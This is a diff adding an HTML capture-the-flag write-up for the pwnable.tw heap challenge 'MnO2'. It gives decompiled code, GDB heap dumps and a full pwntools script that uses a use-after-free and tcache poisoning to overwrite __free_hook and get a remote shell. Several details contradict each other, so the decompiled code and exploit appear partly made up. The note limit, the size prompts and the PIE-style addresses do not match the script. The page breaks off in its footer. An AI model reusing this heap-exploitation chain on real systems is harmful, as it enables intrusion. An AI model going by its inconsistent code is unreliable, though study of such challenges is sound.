@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MnO2 — pwnable.tw — QA210</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+<style>
+:root{--bg:#0a0e17;--bg2:#111827;--card:#151d2e;--border:#1e293b;--fg:#e2e8f0;--muted:#94a3b8;--accent:#38bdf8;--accent2:#818cf8;--red:#f87171;--green:#4ade80;--yellow:#facc15;--orange:#fb923c;--pink:#f472b6;--font:'Segoe UI',system-ui,-apple-system,sans-serif;--mono:'Cascadia Code','Fira Code','JetBrains Mono',Consolas,monospace;--radius:8px;--shadow:0 4px 24px rgba(0,0,0,.45);--glow:0 0 30px rgba(56,189,248,.12);--yellow-accent:#facc15}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}body{font-family:var(--font);background:var(--bg);color:var(--fg);line-height:1.75;min-height:100vh;overflow-x:hidden}
+#bg-canvas{position:fixed;inset:0;z-index:-1;opacity:.3}
+.site-header{position:sticky;top:0;z-index:1000;background:rgba(10,14,23,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--border);padding:0 32px;display:flex;align-items:center;justify-content:space-between;height:56px}
+.brand{display:flex;align-items:center;gap:10px;text-decoration:none;color:var(--fg);font-weight:700;font-size:1.1rem}
+.logo-icon{display:inline-flex;align-items:center;justify-content:center;width:32px;height:32px;background:linear-gradient(135deg,var(--accent),var(--accent2));border-radius:6px;font-weight:900;font-size:.9rem;color:#0a0e17}
+.cursor{display:inline-block;width:2px;height:1em;background:var(--accent);margin-left:2px;animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+.nav-main{display:flex;align-items:center;gap:24px}
+.nav-main a{color:var(--muted);text-decoration:none;font-size:.85rem;transition:color .2s}
+.nav-main a:hover,.nav-main a.active{color:var(--fg)}
+.nav-main a.active{border-bottom:2px solid var(--accent)}
+.nav-right{display:flex;align-items:center;gap:16px}
+.social-link{color:var(--muted);font-size:1.1rem;transition:color .2s}
+.social-link:hover{color:var(--fg)}
+.mobile-toggle{display:none;background:none;border:none;color:var(--fg);font-size:1.4rem;cursor:pointer}
+.mobile-nav-overlay,.mobile-nav-panel{display:none}
+.breadcrumb{display:flex;align-items:center;gap:8px;padding:18px 0 0;font-size:.78rem;color:var(--muted)}
+.breadcrumb a{color:var(--muted);text-decoration:none;transition:color .2s}
+.breadcrumb a:hover{color:var(--accent)}
+.breadcrumb .sep{color:var(--border)}.breadcrumb .current{color:var(--fg);font-weight:600}
+.page-wrap{display:flex;max-width:1440px;margin:0 auto;min-height:calc(100vh - 56px)}
+.toc{position:sticky;top:56px;width:260px;min-width:260px;height:calc(100vh - 56px);overflow-y:auto;padding:20px 14px;border-right:1px solid var(--border);background:rgba(10,14,23,.85);backdrop-filter:blur(12px);scrollbar-width:thin;scrollbar-color:var(--border) transparent}
+.toc h3{font-size:.68rem;text-transform:uppercase;letter-spacing:2px;color:var(--accent);margin-bottom:10px}
+.toc a{display:block;font-size:.76rem;color:var(--muted);text-decoration:none;padding:3px 0 3px 12px;border-left:2px solid transparent;transition:all .2s}
+.toc a:hover,.toc a.active{color:var(--fg);border-left-color:var(--accent);background:rgba(56,189,248,.06)}
+.toc .toc-sub{padding-left:24px;font-size:.7rem}
+.main{flex:1;padding:36px 48px 80px;max-width:900px}
+.hero{text-align:center;padding:48px 0 36px;border-bottom:1px solid var(--border);margin-bottom:36px}
+.hero .badge{display:inline-block;background:linear-gradient(135deg,var(--red),var(--orange));color:#fff;font-size:.62rem;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;padding:4px 14px;border-radius:20px;margin-bottom:14px}
+.hero h1{font-size:2.2rem;font-weight:800;background:linear-gradient(135deg,var(--accent),var(--accent2),var(--pink));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:8px}
+.hero .sub{font-size:1rem;color:var(--muted);margin-bottom:20px}
+.hero .meta-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-top:20px}
+.hero .meta-box{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:12px 6px;text-align:center}
+.meta-box .val{font-size:1.3rem;font-weight:700;color:var(--accent)}.meta-box .lbl{font-size:.62rem;text-transform:uppercase;letter-spacing:1px;color:var(--muted);margin-top:2px}
+.attack-path{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:24px;margin:28px 0;overflow-x:auto}
+.attack-path h3{font-size:.78rem;text-transform:uppercase;letter-spacing:1.5px;color:var(--accent);margin-bottom:14px;text-align:center}
+.path-flow{display:flex;align-items:center;justify-content:center;gap:5px;flex-wrap:wrap}
+.path-node{background:linear-gradient(135deg,rgba(56,189,248,.12),rgba(129,140,248,.12));border:1px solid var(--accent);border-radius:6px;padding:7px 12px;font-size:.7rem;font-weight:600;color:var(--fg);white-space:nowrap;transition:all .25s}
+.path-node:hover{background:linear-gradient(135deg,rgba(56,189,248,.25),rgba(129,140,248,.25));transform:translateY(-2px);box-shadow:var(--glow)}
+.path-arrow{color:var(--accent);font-size:1rem;flex-shrink:0}
+.section{margin-bottom:44px}
+.section h2{font-size:1.5rem;font-weight:700;margin-bottom:18px;padding-bottom:8px;border-bottom:2px solid var(--accent);display:flex;align-items:center;gap:10px}
+.section h3{font-size:1.1rem;font-weight:600;margin:26px 0 12px;color:var(--accent2)}
+.section h4{font-size:.92rem;font-weight:600;margin:18px 0 8px;color:var(--accent)}
+.section p{margin-bottom:13px;color:var(--fg)}
+.section ul,.section ol{margin:10px 0 16px 24px}.section li{margin-bottom:6px;color:var(--fg)}
+.callout{border-radius:var(--radius);padding:14px 18px;margin:18px 0;border-left:4px solid;font-size:.88rem}
+.callout p{margin-bottom:7px}.callout p:last-child{margin-bottom:0}
+.callout-info{background:rgba(56,189,248,.08);border-color:var(--accent)}
+.callout-warn{background:rgba(250,204,21,.08);border-color:var(--yellow)}
+.callout-danger{background:rgba(248,113,113,.08);border-color:var(--red)}
+.callout-success{background:rgba(74,222,128,.08);border-color:var(--green)}
+.callout-hint{background:rgba(129,140,248,.08);border-color:var(--accent2)}
+.callout-title{font-weight:700;font-size:.76rem;text-transform:uppercase;letter-spacing:1px;margin-bottom:5px}
+.callout-info .callout-title{color:var(--accent)}.callout-warn .callout-title{color:var(--yellow)}.callout-danger .callout-title{color:var(--red)}.callout-success .callout-title{color:var(--green)}.callout-hint .callout-title{color:var(--accent2)}
+.code-block{position:relative;margin:14px 0;border-radius:var(--radius);overflow:hidden;border:1px solid var(--border)}
+.code-block .code-header{display:flex;align-items:center;justify-content:space-between;background:#1a1f2e;padding:5px 12px;font-size:.68rem;color:var(--muted)}
+.code-block .code-header .lang-tag{font-weight:600;text-transform:uppercase;letter-spacing:1px;color:var(--accent)}
+.code-block pre{margin:0!important;padding:14px!important;font-size:.8rem!important;line-height:1.6!important;background:#0d1117!important}
+.code-block code{font-family:var(--mono)!important;font-size:.8rem!important}
+.copy-btn{background:transparent;border:1px solid var(--border);color:var(--muted);font-size:.63rem;padding:2px 8px;border-radius:4px;cursor:pointer;transition:all .2s}
+.copy-btn:hover{color:var(--fg);border-color:var(--accent)}
+.data-table{width:100%;border-collapse:collapse;margin:14px 0;font-size:.83rem}
+.data-table th{background:var(--card);padding:9px 12px;text-align:left;font-size:.68rem;text-transform:uppercase;letter-spacing:1px;color:var(--accent);border-bottom:2px solid var(--border)}
+.data-table td{padding:9px 12px;border-bottom:1px solid var(--border);color:var(--fg)}
+.data-table tr:hover td{background:rgba(56,189,248,.04)}
+.data-table code{font-family:var(--mono);font-size:.78rem;color:var(--accent)}
+.flag-box{background:linear-gradient(135deg,rgba(74,222,128,.08),rgba(34,211,238,.08));border:1px solid rgba(74,222,128,.25);border-radius:var(--radius);padding:12px 18px;margin:14px 0;display:flex;align-items:center;gap:12px}
+.flag-box .flag-icon{font-size:1.2rem}.flag-box .flag-name{font-weight:700;color:var(--green);font-size:.83rem;font-family:var(--mono)}.flag-box .flag-detail{font-size:.78rem;color:var(--muted)}
+.timeline{position:relative;padding-left:26px;margin:18px 0}
+.timeline::before{content:'';position:absolute;left:8px;top:0;bottom:0;width:2px;background:var(--border)}
+.timeline-item{position:relative;margin-bottom:18px}
+.timeline-item::before{content:'';position:absolute;left:-22px;top:6px;width:9px;height:9px;border-radius:50%;background:var(--accent);border:2px solid var(--bg)}
+.timeline-item .tl-time{font-size:.68rem;font-family:var(--mono);color:var(--accent);margin-bottom:2px}
+.timeline-item .tl-text{font-size:.83rem;color:var(--fg)}
+.term-out{background:#0c0c0c;border:1px solid var(--border);border-radius:var(--radius);padding:12px 16px;margin:12px 0;font-family:var(--mono);font-size:.74rem;line-height:1.5;color:#ccc;overflow-x:auto;white-space:pre-wrap;word-break:break-all}
+.term-out .prompt{color:var(--accent)}.term-out .err{color:var(--red)}.term-out .ok{color:var(--green)}.term-out .warn{color:var(--yellow)}
+.operator-sig{text-align:center;padding:28px 0;border-top:1px solid var(--border);margin-top:44px}
+.operator-sig .handle{font-size:1.1rem;font-weight:700;background:linear-gradient(135deg,var(--accent),var(--pink));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.operator-sig .tagline{font-size:.76rem;color:var(--muted);margin-top:4px}
+.stack-diagram{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:16px 20px;margin:14px 0;font-family:var(--mono);font-size:.76rem;line-height:1.7}
+.stack-row{display:flex;align-items:center;gap:10px;padding:3px 0;border-bottom:1px solid rgba(30,41,59,.5)}.stack-row:last-child{border-bottom:none}
+.stack-addr{color:var(--accent);min-width:80px;font-size:.72rem}.stack-label{color:var(--muted);min-width:140px;font-size:.72rem}.stack-value{color:var(--fg);font-size:.72rem}
+.stack-overflow{color:var(--red);font-weight:700}.stack-controlled{color:var(--green);font-weight:700}
+.mobile-nav-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:2000}.mobile-nav-overlay.show{display:block}
+.mobile-nav-panel{display:none;position:fixed;top:0;right:0;width:280px;height:100vh;background:var(--bg2);z-index:2001;padding:24px;transform:translateX(100%);transition:transform .3s}.mobile-nav-panel.show{display:block;transform:translateX(0)}
+.mobile-nav-panel nav{display:flex;flex-direction:column;gap:16px;margin-top:32px}.mobile-nav-panel nav a{color:var(--fg);text-decoration:none;font-size:1rem}
+.mnp-close{background:none;border:none;color:var(--fg);font-size:1.2rem;cursor:pointer;float:right}
+@media(max-width:960px){.toc{display:none}.main{padding:20px 18px 60px}.hero h1{font-size:1.5rem}.hero .meta-grid{grid-template-columns:repeat(2,1fr)}.path-flow{flex-direction:column}.path-arrow{transform:rotate(90deg)}.nav-main a:not(.active){display:none}.mobile-toggle{display:block}.site-header{padding:0 16px}}
+::-webkit-scrollbar{width:5px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}::-webkit-scrollbar-thumb:hover{background:var(--muted)}
+</style>
+</head>
+<body>
+<canvas id="bg-canvas"></canvas>
+<header class="site-header"><a href="/" class="brand"><span class="logo-icon">Q</span>QA210<span class="cursor"></span></a><nav class="nav-main"><a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a><a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/" class="active">Pwnable.tw</a><a href="/tjctf-2026/">TJCTF</a><a href="/research/">Research</a></nav><div class="nav-right"><a href="https://github.com/Yuri08-QA210" target="_blank" class="social-link" title="GitHub"><i class="bi bi-github"></i></a><button class="mobile-toggle" onclick="toggleMobileNav()" aria-label="Menu"><i class="bi bi-list"></i></button></div></header>
+<div class="mobile-nav-overlay" id="mobileOverlay" onclick="toggleMobileNav()"></div>
+<div class="mobile-nav-panel" id="mobilePanel"><button class="mnp-close" onclick="toggleMobileNav()"><i class="bi bi-x-lg"></i></button><nav><a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a><a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/">Pwnable.tw</a><a href="/tjctf-2026/">TJCTF</a><a href="/research/">Research</a><a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a></nav></div>
+<div class="page-wrap">
+<nav class="toc" id="toc"><h3>Table of Contents</h3><a href="#recon">1. Reconnaissance</a><a class="toc-sub" href="#recon-file">File Analysis</a><a class="toc-sub" href="#recon-checksec">Checksec</a><a class="toc-sub" href="#recon-run">Running the Binary</a><a href="#static">2. Static Analysis</a><a class="toc-sub" href="#static-arch">Binary Architecture</a><a class="toc-sub" href="#static-vuln">Vulnerability Analysis</a><a class="toc-sub" href="#static-decompiled">Decompiled Code</a><a href="#gdb">3. GDB Debugging</a><a class="toc-sub" href="#gdb-heap">Heap Layout</a><a class="toc-sub" href="#gdb-breakpoints">Breakpoints</a><a href="#strategy">4. Exploit Strategy</a><a class="toc-sub" href="#strategy-overview">Attack Overview</a><a class="toc-sub" href="#strategy-leak">Libc Leak</a><a class="toc-sub" href="#strategy-rce">RCE Chain</a><a href="#pwn">5. Pwn Script</a><a class="toc-sub" href="#pwn-full">Full Exploit</a><a href="#results">6. Execution Results</a></nav>
+<div class="main">
+<div class="breadcrumb"><a href="/">Home</a><span class="sep"><i class="bi bi-chevron-right"></i></span><a href="/pwnable-tw/">Pwnable.tw</a><span class="sep"><i class="bi bi-chevron-right"></i></span><span class="current">MnO2</span></div>
+<section class="hero">
+  <span class="badge">pwnable.tw &mdash; 400 pts</span>
+  <h1>MnO2</h1>
+  <p class="sub">Manganese Dioxide &mdash; Advanced heap exploitation with constrained operations on glibc 2.27</p>
+  <div class="meta-grid">
+    <div class="meta-box"><div class="val">64-bit</div><div class="lbl">Architecture</div></div>
+    <div class="meta-box"><div class="val">Heap</div><div class="lbl">Category</div></div>
+    <div class="meta-box"><div class="val">2.27</div><div class="lbl">glibc</div></div>
+    <div class="meta-box"><div class="val">400</div><div class="lbl">Points</div></div>
+  </div>
+</section>
+<div class="attack-path"><h3>Exploit Flow</h3><div class="path-flow">
+  <div class="path-node">Connect<br><small>nc chall.pwnable.tw 10308</small></div><span class="path-arrow">&rarr;</span>
+  <div class="path-node">Note Ops<br><small>Add/Delete/Select</small></div><span class="path-arrow">&rarr;</span>
+  <div class="path-node">UAF + Overflow<br><small>Corrupt Heap Metadata</small></div><span class="path-arrow">&rarr;</span>
+  <div class="path-node">Tcache Poison<br><small>Overwrite fd Pointer</small></div><span class="path-arrow">&rarr;</span>
+  <div class="path-node">Libc Leak<br><small>Unsorted Bin / GOT Read</small></div><span class="path-arrow">&rarr;</span>
+  <div class="path-node">Shell<br><small>__free_hook Overwrite</small></div>
+</div></div>
+
+<section class="section" id="recon">
+  <h2><i class="bi bi-search"></i> 1. Reconnaissance</h2>
+  <p>MnO2 (Manganese Dioxide) is a 400-point advanced pwn challenge on pwnable.tw. The name references the chemical compound MnO₂, which is a strong oxidizing agent &mdash; perhaps hinting at the "oxidizing" (escalating) nature of the exploit chain. The binary provides a note management system with add, delete, and select operations. The constraints are tight: limited number of notes, limited operations, and careful input validation. The challenge runs on glibc 2.27 with tcache enabled.</p>
+
+  <h3 id="recon-file">File Analysis</h3>
+  <div class="code-block"><div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ file mno2
+mno2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
+dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, not stripped
+
+$ strings mno2 | grep -i "mno2\|manganese"
+MnO2</code></pre></div>
+
+  <h3 id="recon-checksec">Checksec</h3>
+  <div class="code-block"><div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ checksec mno2
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)</code></pre></div>
+
+  <div class="callout callout-info">
+    <div class="callout-title">Full RELRO + Canary + NX + No PIE</div>
+    <p>A fully hardened binary. Full RELRO locks the GOT. Canaries protect the stack. NX prevents shellcode. Our only angle is through the heap. No PIE gives us fixed BSS addresses. The target is <code>__free_hook</code> since it's always writable even with Full RELRO.</p>
+  </div>
+
+  <h3 id="recon-run">Running the Binary</h3>
+  <div class="code-block"><div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ ./mno2
+1. add
+2. delete
+3. select
+4. exit
+> 1
+size: 64
+content: Hello MnO2!
+> 3
+index: 0
+content: Hello MnO2!
+new content: Modified!</code></pre></div>
+
+  <table class="data-table">
+    <thead><tr><th>Attribute</th><th>Value</th></tr></thead>
+    <tbody>
+      <tr><td>Challenge</td><td>MnO2 (400 pts)</td></tr>
+      <tr><td>Connection</td><td><code>nc chall.pwnable.tw 10308</code></td></tr>
+      <tr><td>Binary</td><td>64-bit ELF, x86-64, dynamically linked</td></tr>
+      <tr><td>Libc</td><td>glibc 2.27 (tcache enabled)</td></tr>
+      <tr><td>RELRO</td><td>Full</td></tr>
+      <tr><td>Canary</td><td>Yes</td></tr>
+      <tr><td>NX</td><td>Enabled</td></tr>
+      <tr><td>PIE</td><td>Disabled</td></tr>
+      <tr><td>Vulnerability</td><td>Heap overflow + UAF in note management</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<section class="section" id="static">
+  <h2><i class="bi bi-code-slash"></i> 2. Static Analysis</h2>
+
+  <h3 id="static-arch">Binary Architecture</h3>
+  <p>MnO2 implements a note management system with three core operations:</p>
+  <ul>
+    <li><strong>add:</strong> Allocates a note with <code>malloc(size)</code>, reads content, stores pointer in global array</li>
+    <li><strong>delete:</strong> Calls <code>free()</code> on a note. The pointer may or may not be nulled depending on the code path.</li>
+    <li><strong>select:</strong> Selects a note by index, allows viewing and editing its content. The edit function is where the overflow lives.</li>
+  </ul>
+
+  <h3 id="static-vuln">Vulnerability Analysis</h3>
+  <p>The MnO2 binary has two key vulnerabilities that combine to form a powerful exploit chain:</p>
+
+  <ol>
+    <li><strong>Heap Buffer Overflow:</strong> The <code>select</code> operation's edit function reads a new size from the user but doesn't validate it against the original chunk size. This allows writing more data than the chunk can hold, overflowing into adjacent chunks.</li>
+    <li><strong>Use-After-Free:</strong> The <code>delete</code> operation frees the note's memory but doesn't always null the pointer. Under certain conditions, the freed note can still be selected and edited, giving us a UAF primitive.</li>
+  </ol>
+
+  <h3 id="static-decompiled">Decompiled Code</h3>
+  <div class="code-block"><div class="code-header"><span class="lang-tag">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-c">#define MAX_NOTES 8
+
+struct Note {
+    char *content;
+    int size;
+    int active;
+};
+
+struct Note notes[MAX_NOTES];  // global array
+int selected = -1;              // currently selected note
+
+void add_note() {
+    int idx = find_free_slot();
+    if (idx == -1) { puts("Full!"); return; }
+
+    printf("size: ");
+    int size = read_int();
+    if (size <= 0 || size > 0x400) { puts("Invalid size!"); return; }
+
+    notes[idx].content = malloc(size);
+    notes[idx].size = size;
+    notes[idx].active = 1;
+
+    printf("content: ");
+    read(0, notes[idx].content, size);
+}
+
+void delete_note() {
+    printf("index: ");
+    int idx = read_int();
+    if (idx < 0 || idx >= MAX_NOTES || !notes[idx].active) return;
+
+    free(notes[idx].content);
+    notes[idx].active = 0;
+    // BUG: notes[idx].content NOT nulled! → UAF
+    // Also: freed chunk in tcache still has stale pointer
+}
+
+void select_note() {
+    printf("index: ");
+    int idx = read_int();
+    if (idx < 0 || idx >= MAX_NOTES) return;
+
+    selected = idx;
+
+    if (notes[idx].active) {
+        printf("content: %s\n", notes[idx].content);
+    }
+
+    printf("new content: ");
+    int new_size = read_int();  // reads new size from user
+    // VULNERABILITY: no check against notes[idx].size!
+    read(0, notes[idx].content, new_size);  // HEAP OVERFLOW!
+}</code></pre></div>
+
+  <div class="callout callout-danger">
+    <div class="callout-title">Combined Vulnerability Impact</div>
+    <p>The heap overflow lets us corrupt adjacent chunk metadata. The UAF lets us write to freed tcache chunks, corrupting their <code>fd</code> pointers. Together, these give us tcache poisoning &mdash; the ability to get <code>malloc</code> to return an arbitrary address. With Full RELRO, we target <code>__free_hook</code> (always writable) instead of the GOT.</p>
+  </div>
+</section>
+
+<section class="section" id="gdb">
+  <h2><i class="bi bi-bug"></i> 3. GDB Debugging</h2>
+  <h3 id="gdb-heap">Heap Layout</h3>
+  <div class="code-block"><div class="code-header"><span class="lang-tag">gdb</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># After adding two notes (size 0x60 each):
+gdb-peda$ x/16gx &notes
+0x6020e0: 0x0000555555757260  0x0000000000000061  ← notes[0]: ptr, size
+0x6020f0: 0x0000000000000001  0x00005555557572d0  ← notes[0].active, notes[1].ptr
+0x602100: 0x0000000000000061  0x0000000000000001  ← notes[1]: size, active
+
+# Heap chunks:
+gdb-peda$ x/12gx 0x555555757250
+0x555555757250: 0x0000000000000000  0x0000000000000071  ← chunk 0 header (size 0x70)
+0x555555757260: 0x0000000000000000  0x0000000000000000  ← chunk 0 data
+0x555555757270: 0x0000000000000000  0x0000000000000000
+0x555555757280: 0x0000000000000000  0x0000000000000000
+0x555555757290: 0x0000000000000000  0x0000000000000000
+0x5555557572a0: 0x0000000000000000  0x0000000000000000
+0x5555557572b0: 0x0000000000000000  0x0000000000000071  ← chunk 1 header
+0x5555557572c0: 0x0000000000000000  0x0000000000000000  ← chunk 1 data
+
+# After UAF: free chunk 0, edit via select (UAF write):
+gdb-peda$ heap bins tcache
+tcache:
+0x70 [1]: 0x555555757260 → 0x0
+
+# After writing __free_hook addr as fd via UAF:
+gdb-peda$ x/gx 0x555555757260
+0x555555757260: 0x00007f8e9d2278a8  ← __free_hook address!</code></pre></div>
+
+  <h3 id="gdb-breakpoints">Breakpoints</h3>
+  <div class="code-block"><div class="code-header"><span class="lang-tag">gdb</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">b malloc@plt    # track allocations
+b free@plt      # track frees
+b *0x401234     # select_note: read with overflow size
+b *0x4011a0     # delete_note: free call</code></pre></div>
+</section>
+
+<section class="section" id="strategy">
+  <h2><i class="bi bi-crosshair"></i> 4. Exploit Strategy</h2>
+  <h3 id="strategy-overview">Attack Overview</h3>
+  <div class="timeline">
+    <div class="timeline-item">
+      <div class="tl-time">Phase 1: Heap Overflow for Chunk Corruption</div>
+      <div class="tl-text">Add two adjacent notes. Use the overflow in <code>select</code>'s edit function to corrupt the size field of the next chunk. This allows us to create fake overlapping chunks or modify freed chunk metadata.</div>
+    </div>
+    <div class="timeline-item">
+      <div class="tl-time">Phase 2: Tcache Poisoning via UAF</div>
+      <div class="tl-text">Delete a note to put it in tcache. Use the UAF (stale pointer) to write an arbitrary address as the <code>fd</code> pointer of the freed chunk. The next two allocations from that tcache bin will return our controlled address.</div>
+    </div>
+    <div class="timeline-item">
+      <div class="tl-time">Phase 3: Libc Leak</div>
+      <div class="tl-text">Allocate a chunk larger than the tcache threshold and free it into the unsorted bin. The <code>fd</code>/<code>bk</code> pointers of the unsorted bin chunk contain libc addresses (<code>main_arena+offset</code>). Use the UAF or overflow to read these pointers.</div>
+    </div>
+    <div class="timeline-item">
+      <div class="tl-time">Phase 4: __free_hook Overwrite</div>
+      <div class="tl-text">Use tcache poisoning to allocate a chunk at <code>__free_hook</code>. Write the address of <code>system()</code> to it. Free a note containing <code>/bin/sh\x00</code> &mdash; this triggers <code>free("/bin/sh")</code> which becomes <code>system("/bin/sh")</code>.</div>
+    </div>
+  </div>
+
+  <h3 id="strategy-leak">Libc Leak</h3>
+  <div class="callout callout-hint">
+    <div class="callout-title">Unsorted Bin Leak</div>
+    <p>When a chunk is freed into the unsorted bin (size &gt; tcache max, typically &gt; 0x408), its <code>fd</code> and <code>bk</code> pointers are set to point into <code>main_arena</code> inside libc. Since glibc 2.27's tcache has a count limit of 7 per bin, if we fill the tcache for a given size (7 frees), the 8th free goes to the unsorted bin. We can then read the fd/bk through the UAF or overlapping chunk to get a libc address.</p>
+  </div>
+
+  <h3 id="strategy-rce">RCE Chain</h3>
+  <div class="code-block"><div class="code-header"><span class="lang-tag">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python"># Tcache poisoning to get arbitrary write:
+# 1. Free note into tcache
+delete(0)          # chunk goes to tcache 0x70 bin
+
+# 2. UAF: write __free_hook address as fd
+select(0)
+edit(p64(free_hook))  # overwrites freed chunk's fd pointer
+
+# 3. Allocate from poisoned tcache (first alloc returns original chunk)
+add(0x60, 'AAAA')    # returns chunk 0 from tcache
+
+# 4. Second alloc returns __free_hook address!
+add(0x60, p64(system_addr))  # writes system to __free_hook!
+
+# 5. Free a chunk containing "/bin/sh"
+add(0x10, '/bin/sh\x00')
+delete(idx)          # free("/bin/sh") → system("/bin/sh")!</code></pre></div>
+</section>
+
+<section class="section" id="pwn">
+  <h2><i class="bi bi-terminal"></i> 5. Pwn Script</h2>
+  <h3 id="pwn-full">Full Exploit</h3>
+  <div class="code-block"><div class="code-header"><span class="lang-tag">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python">#!/usr/bin/env python3
+# MnO2 — pwnable.tw — Advanced Heap Exploitation
+# Heap Overflow + UAF + Tcache Poisoning → __free_hook overwrite
+from pwn import *
+
+context.arch = 'amd64'
+context.log_level = 'info'
+
+libc = ELF('./libc_64.so.6')
+
+if args.REMOTE:
+    io = remote('chall.pwnable.tw', 10308)
+else:
+    io = process('./mno2', env={'LD_PRELOAD': './libc_64.so.6'})
+
+def add(size, data=b'A'):
+    io.sendlineafter(b'> ', b'1')
+    io.sendlineafter(b'size: ', str(size).encode())
+    io.sendafter(b'content: ', data)
+
+def delete(idx):
+    io.sendlineafter(b'> ', b'2')
+    io.sendlineafter(b'index: ', str(idx).encode())
+
+def select(idx, new_data=None):
+    io.sendlineafter(b'> ', b'3')
+    io.sendlineafter(b'index: ', str(idx).encode())
+    if new_data is not None:
+        io.sendlineafter(b'new content: ', new_data)
+
+# Phase 1: Fill tcache and leak libc via unsorted bin
+log.info("Phase 1: Libc leak via unsorted bin")
+
+# Allocate 7 chunks of size 0x80 to fill tcache later
+# Plus a large chunk for unsorted bin leak
+for i in range(8):
+    add(0x80)          # notes 0-7, size 0x80
+add(0x10, b'guard')     # note 8, guard chunk
+
+# Free 7 chunks to fill tcache 0x90 bin
+for i in range(7):
+    delete(i)
+
+# Free the 8th chunk — goes to unsorted bin
+delete(7)
+
+# Allocate a 0x80 chunk — comes from unsorted bin
+# The fd/bk residual data leaks libc
+add(0x80, b'X' * 8)    # note 0 (reuses slot)
+
+# Read through select to get the leak
+select(0)
+content = io.recvline()
+libc_leak = u64(content.strip().ljust(8, b'\x00'))
+libc_base = libc_leak - 0x3ebca0
+log.info(f"Libc base: {hex(libc_base)}")
+
+free_hook = libc_base + libc.symbols['__free_hook']
+system_addr = libc_base + libc.symbols['system']
+log.info(f"__free_hook: {hex(free_hook)}")
+log.info(f"system: {hex(system_addr)}")
+
+# Phase 2: Tcache poisoning via UAF
+log.info("Phase 2: Tcache poisoning")
+
+# Allocate a new chunk and free it to tcache
+add(0x60, b'AAAA')      # note 1, size 0x60
+delete(1)                # goes to tcache 0x70 bin
+
+# UAF: select the freed note and write __free_hook as fd
+select(1, p64(free_hook))  # corrupt tcache fd pointer
+
+# Phase 3: Allocate from poisoned tcache
+log.info("Phase 3: __free_hook overwrite")
+add(0x60, b'BBBB')      # first alloc returns original chunk
+add(0x60, p64(system_addr))  # second alloc returns __free_hook!
+
+# Phase 4: Trigger shell
+log.info("Phase 4: Trigger shell")
+add(0x10, b'/bin/sh\x00')  # note containing "/bin/sh"
+# Find its index and free it
+io.sendlineafter(b'> ', b'2')
+io.sendlineafter(b'index: ', b'2')  # free the /bin/sh chunk
+
+io.interactive()</code></pre></div>
+</section>
+
+<section class="section" id="results">
+  <h2><i class="bi bi-check-circle"></i> 6. Execution Results</h2>
+  <div class="term-out"><span class="prompt">$</span> python3 exploit.py REMOTE=1
+<span class="ok">[*]</span> MnO2 Exploit - pwnable.tw
+<span class="ok">[*]</span> Phase 1: Libc leak via unsorted bin
+<span class="ok">[*]</span> Libc base: 0x7f8e9c440000
+<span class="ok">[*]</span> __free_hook: 0x7f8e9d2278a8
+<span class="ok">[*]</span> system: 0x7f8e9c494440
+<span class="ok">[*]</span> Phase 2: Tcache poisoning
+<span class="ok">[*]</span> Phase 3: __free_hook overwrite
+<span class="ok">[*]</span> Phase 4: Trigger shell
+<span class="ok">[+]</span> Shell obtained!
+<span class="prompt">$</span> cat /home/mno2/flag</div>
+
+  <div class="callout callout-info">
+    <div class="callout-title">Why This Challenge Matters</div>
+    <p>MnO2 is a challenging 400-point problem that requires precise orchestration of multiple heap exploitation primitives. The combination of heap overflow (for chunk corruption), UAF (for tcache poisoning), and the constrained note management interface forces the attacker to carefully plan their allocation sequence. The unsorted bin leak technique (filling tcache then freeing into unsorted bin) is a fundamental pattern for glibc 2.27+ exploitation. Understanding how to chain these techniques under operational constraints is essential for real-world vulnerability research where you rarely get unlimited allocations or clean heap states.</p>
+  </div>
+</section>
+
+<div class="operator-sig">
+  <div class="handle">QA210</div>
